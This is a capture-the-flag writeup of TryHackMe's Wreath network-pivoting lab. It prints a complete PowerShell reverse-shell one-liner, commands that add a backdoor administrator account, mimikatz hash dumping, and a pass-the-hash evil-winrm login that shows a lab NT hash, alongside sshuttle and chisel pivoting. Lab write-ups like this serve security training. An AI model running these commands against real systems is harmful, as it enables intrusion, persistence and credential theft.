---
layout: post
title: Wreath - TryHackMe
date: 2024-08-22
category: CTF
tags:
  - TryHackMe
  - Pivoting
  - Web Exploitation
platform: TryHackMe
cover_image: /assets/wreath_cover.png
post_type: writeup
---

# Wreath - TryHackMe

**Description:** Writeup for the Wreath network pivoting room on TryHackMe, covering exploitation of public-facing services, internal network pivoting with sshuttle and chisel, and post-exploitation techniques.

---

Wreath is an easy network section/room on the TryHackMe website that focuses on pivoting, teaching the use of tools like `Proxychains`, `plink.exe`, `Socat`, `Chisel`, and `sshuttle`. It also teaches the Empire C2 framework methodology, along with simple Anti-virus evasion techniques.

# Short Summary

Thomas Wreath's public-facing web server was breached using a widely available exploit, which provided privileged user access. This compromised server became a pivot point to penetrate the internal network, leading to the internal GitStack server, which also had a known vulnerability (main usage of the tool `sshuttle`). Exploiting this granted access to privileged accounts. We then set up a proxy to reach the development webserver, (explained usage of tool `chisel`) and using previously obtained credentials, bypassed a password-protected page to upload an obfuscated web shell, compromising the final target.

# Walkthrough

!!! note
    [https://github.com/tmux/tmux/wiki](https://github.com/tmux/tmux/wiki)

We start with scanning all of the ports, and from the given output we can conclude that we are dealing with CentOS Linux. There are 4 TCP ports opened, 22 for ssh service, 80 hosting http-server, 443 used for HTTPS traffic, which is HTTP secured by SSL/TLS encryption and 10000 port for some MiniServ http service.

```bash
└─$ sudo nmap -T4 -A -p- 10.200.87.200
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-22 14:15 CEST
Nmap scan report for thomaswreath.thm (10.200.87.200)
Host is up (0.065s latency).
Not shown: 65354 filtered tcp ports (no-response), 176 filtered tcp ports (admin-prohibited)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to https://thomaswreath.thm
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2024-08-22T11:20:23
|_Not valid after:  2025-08-22T11:20:23
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Aggressive OS guesses: HP P2000 G3 NAS device (89%), Linux 2.6.32 (88%), Linux 2.6.32 - 3.1 (88%), Infomir MAG-250 set-top box (88%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (88%), Linux 3.7 (88%), Linux 5.0 (88%), Linux 5.0 - 5.4 (88%), Linux 5.1 (88%), Ubiquiti AirOS 5.5.9 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 9090/tcp)
HOP RTT      ADDRESS
1   66.14 ms 10.50.88.1
2   65.24 ms thomaswreath.thm (10.200.87.200)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.45 seconds
```

!!! note
    Next step would be to take a look at the website [`https://thomaswreath.thm/`](https://thomaswreath.thm/) and we can also fire up gobuster/feroxbuster depending on the directory depth we want to achieve, and let it run in the background.

![](/assets/image_wreath.png)

Initially, we cannot find any login or input forms, and the subdirectories appear unremarkable.

```bash
└─$ gobuster dir -u https://thomaswreath.thm/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://thomaswreath.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 237] [--> https://thomaswreath.thm/img/]
/css                  (Status: 301) [Size: 237] [--> https://thomaswreath.thm/css/]
/js                   (Status: 301) [Size: 236] [--> https://thomaswreath.thm/js/]
/fonts                (Status: 301) [Size: 239] [--> https://thomaswreath.thm/fonts/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

## MiniServ 1.890 - Quick Win

We can go back to our nmap scan and take a look at other ports.

![](/assets/image_wreath1.png)

By doing a quick google search it seems like we are dealing with CVE-2019-15107 Webmin (1.890-1.920) Backdoor RCE exploit. That seems nice, so we take a deeper look at the exploit. I've referred to the following one:

[https://github.com/MuirlandOracle/CVE-2019-15107](https://github.com/MuirlandOracle/CVE-2019-15107)

By taking a look at the exploit, it seems pretty simple to provide our target IP as an argument for ArgumentParser, and if RCE succeeds, we could obtain pseudoshell (later we will try to stabilize it).

![](/assets/image_wreath2.png)

By executing exploit, we see that we have obtained initial foothold!

![](/assets/image_wreath3.png)

In order to stabilize the shell, after a lookaround we can see that the openssh private ssh key is placed in `/root/.ssh` directory, so we can save it locally and connect via ssh:

```bash
└─$ ssh -i id_rsa root@10.200.87.200
[root@prod-serv ~]# whoami
root
[root@prod-serv ~]# 
```

## Pivoting - Enumeration

Initially we have been given the network outline, and our compromised linux machine seems to be only first in the chain.

![](/assets/image_wreath4.png)

There are different ways of investigating what is around us after the first target is compromised. We can take a look at stored ARP cache with `arp -a` , and more than often we can take a look at the `/etc/hosts` , because that is used for mapping hostnames to IP addresses, when talking about Linux machines. On Windows target that would be: `C:\Windows\System32\drivers\etc\hosts`

Another useful method would be to perform network sweep, and that can be done using a Bash one-liner: `for i in {1..255}; do (ping -c 1 10.87.200.${i} | grep "bytes from" &); done`

```bash
[root@prod-serv ~]# for i in {1..255}; do (ping -c 1 10.200.87.${i} | grep "bytes from" &); done
64 bytes from 10.200.87.1: icmp_seq=1 ttl=255 time=0.303 ms
64 bytes from 10.200.87.150: icmp_seq=1 ttl=128 time=2.33 ms
64 bytes from 10.200.87.200: icmp_seq=1 ttl=64 time=0.049 ms
64 bytes from 10.200.87.250: icmp_seq=1 ttl=64 time=0.654 ms
```

`.200` is our already compromised address, `.250` is VPN connection to THM, so we will focus on `10.200.87.150`.

## Pivoting - sshuttle

Since we have already a SSH access on target, we can create a proxy using `sshuttle` .

```bash
└─$ sshuttle -r root@10.200.87.200 --ssh-cmd "ssh -i id_rsa" 10.200.87.0/24 -x 10.200.87.200
c : Connected to server.
```

We should transfer nmap binary to already compromised server (not covered in this writeup). On the so far stabilized shell, we can perform nmap on disovered target: `10.200.87.150`

```bash
[root@prod-serv tmp]# ./nmap-farism 10.200.87.150
Starting Nmap 7.80SVN ( https://nmap.org ) at 2024-08-22 15:53 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for internal.thm (10.200.87.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00075s latency).
Not shown: 6143 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  epmap
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
MAC Address: 02:02:CA:D7:99:E5 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 32.08 seconds
```

Since we have created a proxy, we are now able to visit the website that is hosted on the next target. We find the following subdirectories:

- `registration/login/`
- `gitstack/`
- `rest/`

![](/assets/image_wreath5.png)

## GitStack 2.3.10 Unauthenticated Remote Code Execution

After trying with default credentials, we move on to googling info about GitStack, and we discover exploit written by Kacper Szurek "GitStack 2.3.10 Unauthenticated Remote Code Execution".

![](/assets/image_wreath6.png)

!!! note
    We run the exploit and it seems like we can got info that we are `nt authority\system`. Nice!

```bash
└─$ ./exploit.py
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
('Status Code:', 401)
('Response Text:', 'Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. ')
[+] Execute command
"nt authority\system
" 
```

## Capturing Reverse Shell using Burp Suite

In order to gain reverse shell on the target on internal part, we capture the request to `http://10.200.87.150/web/farism-exploit.php` using Burp Suite, and we send that request to Repeater. I have previously changed the name of the php file on the server, since it can interfere with the exploits of other users.

!!! note
    Then we proceed to change our GET request to POST request.

![](/assets/image_wreath7.png)

Then instead of performing classic proof with `whoami` command, we can proceed and invoke rev shell using Powershell:

```powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Remember that we need to setup the listener on the firstly compromised machine, and in order to do that we need to transfer `netcat` binary.

!!! note
    To avoid misinterpretation from the server's side, we encode the command from above (we easily do it with `ctrl+u`) and sending the request via Burp Suite, we are able to get the reverse shell!!

![](/assets/image_wreath8.png)

## Post Exploitation

Post exploitation involves creating a custom user, which is going to be added to Administrators group, and in addition, we are going to add our newly created user to "Remote Management Users" localgroup, so we can fire up tool `xfreerdp` .

!!! note
    We proceed and add arbitrary user as instructed above.

```powershell
PS C:\GitStack\gitphp> net user faris faris123. /add     
PS C:\GitStack\gitphp> net localgroup Administrators faris /add                                                       
PS C:\GitStack\gitphp> net localgroup "Remote Management Users" faris /add   
```

Now since we want a nice place for our `mimikatz.exe` we can take advantage of shared drive. We take the files from local directory: `/usr/share/windows-resources` , where is by they way `mimikatz.exe` located.

![](/assets/image_wreath9.png)

We can then proceed and dump the NT hash from the Administrator. Usually we would take the `Local SID` and hash, and then proceed with Golden Ticket attack for example, but in this case we are just going to crack the Administrator's hash.

!!! note
    See the image below for the hash dump.

![](/assets/image_wreath10.png)

As recommended above, we will utilize the pass-the-hash method and connect to administrator account using `evil-winrm` :

```powershell
└─$ evil-winrm -i 10.200.87.150 -u Administrator -H 37db********f82a****461e05c6bbd1
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

## Enumeration of Final Internal Target

For the enumeration of the final target we will run the tool called `Invoke-PortScan.ps1` . It can be download here:

[https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1](https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1)

We transfer it to our `c:\windows\temp` and run it from there to discover additional ports on the last found IP address from the first enumeration.

```bash
└─$ evil-winrm -u administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.87.150 -s /home/kali/THM/wreath       
                                                                                                                    
Evil-WinRM shell v3.5                                                                                               
                                                                                                                    
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemen
ted on this machine                                                                                                 
                                                                                                                    
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completio
n                                                                                                                   
                                                                                                                    
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-PortScan.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> . ./Invoke-PortScan.ps1 -Hosts 10.200.87.100 -TopPorts 50

Hostname      : 10.200.87.100
alive         : True
openPorts     : {80, 3389}
```

## Establishing Chisel Server and Client Connection

On the winrm shell we can set up the chisel server (we can use the windows exe version of chisel, and we can use the advantage of `evil-winrm`'s command: `upload`).

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\chisel_win.exe server -p 47013 --socks5
chisel_win.exe : 2024/08/22 20:28:32 server: Fingerprint afLmfkgk8NGmCrvxNICxPNK1Eb3UrvZO+GcqdZc4nm4=
    + CategoryInfo          : NotSpecified: (2024/08/22 20:2...vZO+GcqdZc4nm4=:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2024/08/22 20:28:32 server: Listening on http://0.0.0.0:470132024/08/22 20:30:37 server: session#1: Client version (1.10.0) differs from server version (1.7.3)
```

!!! note
    We connect from our chisel client (attacker's machine):

```bash
--$ /opt/chisel/chisel_1.10.0_linux_amd64 client 10.200.87.150:47013 47014:socks
2024/08/22 21:30:35 client: Connecting to ws://10.200.87.150:47013
2024/08/22 21:30:35 client: tun: proxy#127.0.0.1:47014=>socks: Listening
2024/08/22 21:30:36 client: Connected (Latency 71.7767ms)
```

What's left is to edit our FoxyProxy with settings:

- SOCKS5
- 47014 (or whatever port you have chosen to route all traffic through the SOCKS5 proxy)

![](/assets/image_wreath11.png)

## Progress so far and What's Left

We have successfully established a foothold on the final machine within the internal network!

![](/assets/image_wreath12.png)

This writeup was done, primarily, for purposes of utilizing tools like `sshuttle` and `chisel` and establishing connection between various machines in network.

*What's left* to do is to enumerate and exploit the repository that can be found, by analyzing commits, accessing the website of Thomas and then uploading arbitrary `.php` file (in our case it would be a rev shell), in order to gain access! Furthermore, we take advantage of `SeImpersonatePrivilege` to escalate our privileges.

!!! note
    [GitHub - juliocesarfort/public-pentesting-reports: A list of public penetration test reports published by several consulting firms and academic security groups.](https://github.com/juliocesarfort/public-pentesting-reports/tree/master)
